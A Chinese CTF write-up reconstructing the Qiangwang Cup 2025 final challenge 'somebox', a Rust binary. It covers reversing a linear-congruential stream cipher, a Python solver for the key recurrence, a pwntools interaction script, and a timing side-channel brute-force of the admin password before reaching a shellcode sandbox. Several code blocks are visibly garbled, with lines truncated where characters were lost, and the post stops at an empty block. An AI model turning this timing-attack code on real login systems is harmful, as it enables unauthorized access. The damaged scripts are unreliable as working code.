
# [CTF] 强网杯2025决赛题目复现

- 原帖: https://www.52pojie.cn/forum.php?mod=viewthread&tid=2075908
- 抓取时间: 2026-11-01T21:58:53

本篇文章作个人复现 2025 强网杯决赛赛题的记录。

## AWDU

### somebox

这道题是 `rust` 的综合题，总体难度算很高的了，并要求选手掌握很深的逆向功底，密码学技术和 `shellcode` 编写技术。

![](https://xia0ji233.pro/2025/11/26/qwb2025_final/1.png)

上来一串加密的数据，让人看得一脸懵逼，只能开逆了，主逻辑在 `sub_1AB40` 中，通过字符串发现一个菜单

![](https://xia0ji233.pro/2025/11/26/qwb2025_final/2.png)

顺着这个 `menu` 字符串可以找到关键结构

![](https://xia0ji233.pro/2025/11/26/qwb2025_final/3.png)

很显然，`1FA20` 就是所谓的加密函数了。

![](https://xia0ji233.pro/2025/11/26/qwb2025_final/4.png)

很好，非常无敌的加密，猜测一下 `a1` 的结构，如下：

```
struct encryptData
{
    __int64 k[4];
    __int64 b[4];
    __int64 key[4];
    __int64 idx;
};
```

根据加密的算法可以看出来，这是一个流式的加密，密钥递推符合如下公示：

`a[n] = k * a[n-1] + b`

其中 `k` 和 `b` 是随机生成的，其中只有 `a[0]` 是已知的，也就是该结构体 `key` 的初始值。

![](https://xia0ji233.pro/2025/11/26/qwb2025_final/5.png)

`v8` 对原文仅仅做了异或操作，而流式 `key` 保存在 `v6`，经过一系列的变化得到了 `v8`，在 `v6->v7` 和 `v7->v8` 的过程显然都是可逆的，那么只需要拿到异或得到的值，即可解出原 `key`。由于它四个 `key` 是轮转的，这就导致了开头的 32 字节加密是固定的，后续全部是随机。开头输出的菜单原文是已知的，也就是说，现在已知原文，密文，那么开头原文的一系列密钥是已知的，即说对于这四个数列 `key1[n]`、`key2[n]`、`key3[n]`、`key4[n]`，可以知道它们的前几项。

我们又已知数列的递推公式均满足 `key[n] = (k * key[n-1] + b) mod pow(2,64) | (n>=1)`

经过逆向把这些信息总结出来之后，就是 call 队伍里的密码学师傅了，个人认为解释的非常清楚了.

![](https://xia0ji233.pro/2025/11/26/qwb2025_final/6.png)

密码学师傅非常给力，很快给了我脚本，根据前几项来推测 `k` 和 `b` 的值，尽管可能有多解，实测发现多解情况随便选一组解不影响加解密。

```
# 输入：已有的若干项（无符号 64 位，Python int 足够）
from math import gcd
M = 1  有解当且仅当 dy ≡ 0 (mod M)
        return [0] if dy == 0 else []  # 特殊：dx==0 不约束 k，如果 dy==0 则任意 k 可，返回 placeholder
    g = gcd(dx, M)
    if dy % g != 0:
        return []
    # 除以 g，在模 M' 下求逆
    dxp = dx // g
    dyp = dy // g
    Mp = M // g
    # 计算 (dxp)^(-1) mod Mp
    # 使用扩展欧几里得或 pow since Mp 不是素数但 gcd(dxp, Mp)==1
    inv = pow(dxp, -1, Mp)  # Python 3.8+
    k0 = (dyp * inv) % Mp
    # 所有解为 k0 + t*Mp, t=0..g-1
    return [(k0 + t * Mp) % M for t in range(g)]

def find_k_b_from_sequence(seq):
    n = len(seq)
    if n  整个序列不可能来自同一线性映射
        # 若 dx==0 且 dy==0 意味着这三项对 k 不产生约束，继续找下一组
        if dx == 0 and dy == 0:
            continue
        # 否则 ks 为候选集合（注意：若 dx==0 and dy==0 we skipped）
        candidates = ks
        break

    # 如果一直没有约束（全部相等或每组三项都 dx==0,dy==0），处理特殊情形
    if candidates is None:
        # 所有相邻差都为0 => seq 都相同 => (k-1)*c + b ≡ 0 (mod M),无限多解
        return "ALL_EQUAL"  # 提示无限多解（或需要更多约束）

    # 验证候选，保留能让所有已知项成立的那些
    valid = []
    for k in candidates:
        b = (seq[1] - (k * seq[0])) % M
        ok = True
        for i in range(n - 1):
            if ((k * seq[i] + b) - seq[i + 1]) % M != 0:
                ok = False;
                break
        if ok:
            valid.append((k, b))
    return valid
```

把这个脚本保存为 `m.py`，可以构造交互了，因为系统会将用户输入的 `hex` 也加密一遍之后去理解含义，所以输入的时候需要进行一次加密（这个流加密可以验证加密和解密都能使用同一个函数），但是它们共享密钥生成器，所以这里需要做好分配。

初始密钥直接断函数看栈数据就行。

![](https://xia0ji233.pro/2025/11/26/qwb2025_final/7.png)

下面是交互脚本：

```
from pwn import *

from m import find_k_b_from_sequence

context.log_level = 'debug'

context.arch = 'amd64'

import os

import sys

from pwn import *

# from z3 import *

def ror64(value, shift, bits=64):

    """64位循环右移 - rol64的逆操作"""

    shift %= bits

    return ((value >> shift) | (value > (bits - shift))) & ((1 > 1) ^ ((v6 ^ (v6 >> 1)) >> 2) ^ ((v6 ^ (v6 >> 1) ^ ((v6 ^ (v6 >> 1)) >> 2)) >> 4) ^ (

                (v6 ^ (v6 >> 1) ^ ((v6 ^ (v6 >> 1)) >> 2) ^ ((v6 ^ (v6 >> 1) ^ ((v6 ^ (v6 >> 1)) >> 2)) >> 4)) >> 8) ^ (

                     (v6 ^ (v6 >> 1) ^ ((v6 ^ (v6 >> 1)) >> 2) ^ ((v6 ^ (v6 >> 1) ^ ((v6 ^ (v6 >> 1)) >> 2)) >> 4) ^ ((

                                                                                                                                  v6 ^ (

                                                                                                                                      v6 >> 1) ^ (

                                                                                                                                              (

                                                                                                                                                          v6 ^ (

                                                                                                                                                              v6 >> 1)) >> 2) ^ (

                                                                                                                                              (

                                                                                                                                                          v6 ^ (

                                                                                                                                                              v6 >> 1) ^ (

                                                                                                                                                                      (

                                                                                                                                                                                  v6 ^ (

                                                                                                                                                                                      v6 >> 1)) >> 2)) >> 4)) >> 8)) >> 16)

    v7 = v7 & 0xFFFFFFFFFFFFFFFF

    v7h = v7 >> 32

    v8 = rol64(v7 ^ v7h, 7)

    return v8

def inverse_xor_shift(y, k):

    """逆异或变换：从 y 恢复 x，满足 y = x ^ (x >> k)"""

    x = y

    shift = k

    while shift > shift)

        shift *= 2

    return x & 0xFFFFFFFFFFFFFFFF

def inverse_mix(v8):

    """mix 函数的逆向算法"""

    # 步骤1: 循环右移7位得到 u

    u = ror64(v8, 7)

    # 步骤2: 从 u 恢复 v7

    u_high = (u >> 32) & 0xFFFFFFFF

    u_low = u & 0xFFFFFFFF

    v7_high = u_high

    v7_low = u_low ^ u_high

    v7 = (v7_high
```

这样就可以成功和这个系统交互了，注意功能 1 并没有加密，而是直接输出，所以密钥不能轮转，事实上 1 功能在比赛中是用不到的功能。

![](https://xia0ji233.pro/2025/11/26/qwb2025_final/8.png)

分析登录功能，同样顺着字符串找关键位置，但是因为选手不可能手动和这个 `ELF` 交互，必须用 `pwntools`，所以需要借助 `dbg_server` 的附加功能完成调试，操作步骤为：

- 开启 `dbg_server`
- 在对应机器上使用 `pwntools` 运行程序。
- `ida` 选择进程附加

附截图，开启 `server`，运行 `exp`

![](https://xia0ji233.pro/2025/11/26/qwb2025_final/9.png)

调试选项选附加

![](https://xia0ji233.pro/2025/11/26/qwb2025_final/10.png)

选择对应的进程

![](https://xia0ji233.pro/2025/11/26/qwb2025_final/11.png)

然后就可以美美调试了。

![](https://xia0ji233.pro/2025/11/26/qwb2025_final/12.png)

根据逻辑可知，用户名必须为 `admin`，`password` 经过调试是随机生成的。

![](https://xia0ji233.pro/2025/11/26/qwb2025_final/13.png)

每次判断密码正确会 `sleep 5ms`，根据这个特性可以逐字节爆破。

```
def brutePassword():
    password = bytearray(16)
    current = 0
    for i in range(128):
        found = False
        for c in range(33,0x7F):
            password[current] = c
            r.sendline(encrypt(b'2').encode())
            decrypt(r.recvline()).decode()
            r.sendline(encrypt(b'admin').encode())
            decrypt(r.recvline()).decode() # enter password
            r.sendline(encrypt(password.strip(b'\x00')).encode())
            result = decrypt(r.recvline()).decode()
            pos = result.find('(')
            rpos = result.find('ms)')
            if(rpos == -1):
                print("!!!",password.strip(b'\x00'))
                return password.strip(b'\x00')
            T = int(result[pos+1:rpos])
            if(T >= 5*current +5):
                print(password.strip(b'\x00'),result,T)
                current += 1
                found = True
            if(found):
                break
        if(not found):
            password[current] = 0
            current -= 1
    return password
```

为了本地调试方便，把密码 patch 了，让它永远返回正确，因为后面才是大头。

![](https://xia0ji233.pro/2025/11/26/qwb2025_final/14.png)

简单粗暴点就行。

根据功能 3 找到具体执行的位置。

![](https://xia0ji233.pro/2025/11/26/qwb2025_final/15.png)

这里可以看到用 `mmap` 分配了权限为 7 的内存段。

![](https://xia0ji233.pro/2025/11/26/qwb2025_final/16.png)

它在执行之前会把可写权限关闭，并且满足一定的条件下会随机打乱输入的 `shellcode`。

全部算法如下

```
```
